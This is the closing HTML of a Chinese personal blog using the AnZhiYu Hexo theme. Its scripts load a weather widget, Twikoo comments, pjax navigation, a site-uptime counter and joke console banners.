</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("4/15/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2023 By 安知鱼 V1.6.8",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Jack hou 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
  var grt = new Date("4/15/2023 00:00:00"); //设置网站上线时间
  var now = new Date();
  var dnum;
  var hnum;
  var mnum;
  var snum;
  var nowHour;

  // 计算并更新天数、小时数、分钟数和秒数
  function updateTime() {
    now = new Date(); // 更新 now 的值
    nowHour = now.getHours(); // 更新 nowHour 的值
    var days = (now - grt) / 1000 / 60 / 60 / 24;
    dnum = Math.floor(days);
    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
      hnum = "0" + hnum;
    }
    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
      mnum = "0" + mnum;
    }
    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
      snum = "0" + snum;
    }
  }

  // 更新网页中显示的网站运行时间
  function updateHtml() {
    const footer = document.getElementById("footer");
    if (!footer) return
    let currentTimeHtml = "";
    if (nowHour < 18 && nowHour >= 9) {
      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    } else {
      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
      let img = document.querySelector("#workboard .workSituationImg");
      img.src = "https://npm.elemecdn.com/anzhiyu-blog@2.0.4/img/badge/安知鱼-下班啦.svg";
      img.title = "下班了就该开开心心的玩耍，嘿嘿~";
      img.alt = "下班了就该开开心心的玩耍，嘿嘿~";

      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    }

    if (document.getElementById("runtimeTextTip")) {
      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
    }
  }

  setInterval(() => {
    updateTime();
    updateHtml();
  }, 1000);
})();</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://twikoo.houyanbin.com/',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo.houyanbin.com/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://twikoo.houyanbin.com/',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom.innerHTML= result
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "visitor@anzhiy.cn";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>